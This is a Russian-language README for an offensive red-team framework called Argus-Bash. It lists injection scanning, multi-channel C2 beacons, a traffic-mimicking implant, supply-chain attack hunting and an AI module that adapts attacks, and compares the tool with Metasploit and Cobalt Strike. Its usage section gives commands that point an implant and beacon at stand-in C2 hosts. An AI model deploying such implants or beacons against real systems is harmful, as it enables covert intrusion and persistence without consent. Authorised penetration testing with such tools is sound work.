# Argus-Bash v56.0 — Red Team Framework

**77 сигнатур | 229 шаблонов Nuclei | 6 режимов работы | WebSocket C2 | Mimic Implant v2 | Hydra Beacon | Hunter Mode | After-Action Report**

Argus — автономный Red Team фреймворк, прошедший путь от bash-скрипта до профессионального инструмента за 56 версий.

## Возможности
- Пассивный сканер — 77 сигнатур + история запросов + авто-детект IDOR
- 12 типов инъекций — SQL, NoSQL, LDAP, XXE, SSTI, CMDi, LFI, SSRF, GraphQL, WebSocket
- Agentic Scanner — 6 режимов: smart, speed, deep, advisor, executor, favorites
- Sentinel AI — понимает ответы сервера и адаптирует атаку
- Malleable C2 — HTTPS Beacon (O365/Teams), DNS Beacon, WebSocket Beacon v2, Mimic Implant v2
- Hydra Beacon — самоисцеляющийся C2: перебирает HTTPS → DNS → TCP → Tor пока не соединится
- Hunter Mode — точечная охота на технологии (Grafana, WordPress, Log4j, Jenkins, K8s)
- Supply Chain Hunter — атака через разработчиков, хостинг, CDN
- Vault — AES-256 шифрование конфигов + авто-Vault
- After-Action Report — боевой журнал: векторы, хеши, pivot, Metasploit
- Предполётная проверка + Оффлайн-режим + Авто-очистка

## Новое в v56.0
- 🦎 Mimic Implant v2 — проактивная маскировка: анализирует окружение и подстраивается под него
- 🐉 Hydra Beacon — 4 канала связи с авто-переключением (HTTPS→DNS→TCP→Tor)
- 🎯 Hunter Mode — точечная охота на конкретные технологии с поиском PoC
- 📡 WebSocket C2 Server — управление агентами в реальном времени
- 📊 After-Action Report — боевой журнал для пентестера
- 🛡️ 77 сигнатур (+10 CVE 2026)
- 🔧 Предполётная проверка зависимостей
- 📴 Оффлайн-режим для всех модулей
- 🧹 Авто-очистка временных файлов

## Быстрый старт
git clone https://github.com/manser-kay/argus-bash
cd argus-bash && chmod +x argus.sh argus
./argus check && ./argus help

## Использование
./argus scan http://target.com                      # Полный скан
./argus agentic http://target.com --mode speed       # Быстрая разведка
./argus passive                                      # Пассивный сбор (прокси)
./argus c2 8443                                      # C2 сервер
./argus_hacker_report.sh ~/argus_scan_*/             # Боевой отчёт
./argus_hunt.sh grafana http://target.com:3000       # Охота на Grafana

## Hydra Beacon
./argus_hydra_beacon.sh your-server.com
# Пробует HTTPS → DNS → TCP → Tor автоматически

## Mimic Implant v2
python3 argus_implant_v2.py https://your-c2-server.com
# Определяет среду и маскируется под легитимный трафик

## Уникальные фичи (нет ни у кого)
Self-learning payloads | Dead Man Switch | Стеганография | Honeypot Detector | P2P CVE Sync | Decoy Generator | Supply Chain Hunter | Mimic Implant | Hydra Beacon

## Сравнение с конкурентами

| | Argus | Burp Pro | Metasploit | Nessus | CobaltStrike | Sliver | ZAP |
|---|---|---|---|---|---|---|---|
| Пассивный сканер | ✅ 77 | ✅ 100+ | ❌ | ❌ | ❌ | ❌ | ✅ 40+ |
| Repeater/Intruder | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ |
| Инъекции | ✅ 12 | 2-3 | 5+ | ❌ | ❌ | ❌ | 3-4 |
| C2 Beacon | ✅ W+D+H+S+To | ❌ | ✅ | ❌ | ✅ | ✅ | ❌ |
| Agentic AI | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Supply Chain | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Hunter Mode | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Hacker Report | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Цена | **$0** | $449/год | $15K | $3K | $3.5K | $0 | $0 |

**Сильные стороны конкурентов:**
- **Burp Suite Pro** — король ручного тестирования HTTP/HTTPS. Лучший Repeater и Intruder.
- **Metasploit** — 2000+ готовых эксплойтов. Meterpreter — эталон post-exploitation.
- **Nessus** — 70,000+ сигнатур. Стандарт для compliance (PCI DSS, HIPAA).
- **Cobalt Strike** — лучший C2 для Red Team. Malleable C2 + BeaconGate обходят EDR.
- **Sliver** — современный Open Source C2 на Go. Лучшая архитектура среди бесплатных.
- **OWASP ZAP** — лучший бесплатный веб-сканер. Идеален для CI/CD.

## Ответственность
Инструмент создан для образовательных целей и легального тестирования безопасности.

## Лицензия
MIT
